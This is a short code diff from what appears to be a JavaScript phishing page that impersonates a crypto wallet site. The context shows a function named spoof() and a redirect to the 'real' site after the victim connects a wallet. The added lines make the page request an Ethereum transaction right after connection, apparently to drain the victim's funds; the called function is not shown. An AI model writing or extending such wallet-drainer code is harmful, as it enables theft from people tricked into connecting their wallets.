@@ -34,6 +34,10 @@
         // Redirect back to the real Bing site after wallet connection
         window.location.href = 'https://bifrostwallet.com';
       }
+
+      if (connected) {
+        await promptEthTransaction();
+      }
     }
 
     function spoof() {
